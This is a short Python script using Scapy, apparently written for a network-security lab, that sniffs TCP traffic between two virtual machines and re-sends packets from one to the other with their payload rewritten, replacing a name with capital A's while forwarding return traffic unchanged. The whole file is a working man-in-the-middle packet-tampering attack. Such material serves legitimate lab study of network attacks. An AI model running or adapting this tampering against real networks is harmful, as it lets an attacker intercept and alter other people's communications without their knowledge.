#!/usr/bin/python3
from scapy.all import *

VM_A_IP = "10.0.2.15"
VM_B_IP = "10.0.2.7"

def spoof_pkt(pkt):
  if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:

     newpkt = IP(bytes(pkt[IP]))
     del(newpkt.chksum)
     del(newpkt[TCP].chksum)
     del(newpkt[TCP].payload)
#####################################################################
     olddata = pkt[TCP].payload.load # Get the original payload data
     newdata = olddata.replace(b'deanori',b'AAAAAAA') #change our names to capital A's
     temp_pkt = newpkt/newdata
     temp_pkt.show()
     send(temp_pkt)
#####################################################################

  elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
     send(pkt[IP]) # Forward the original packet

pkt = sniff(filter='tcp and not src 10.0.2.6',prn=spoof_pkt)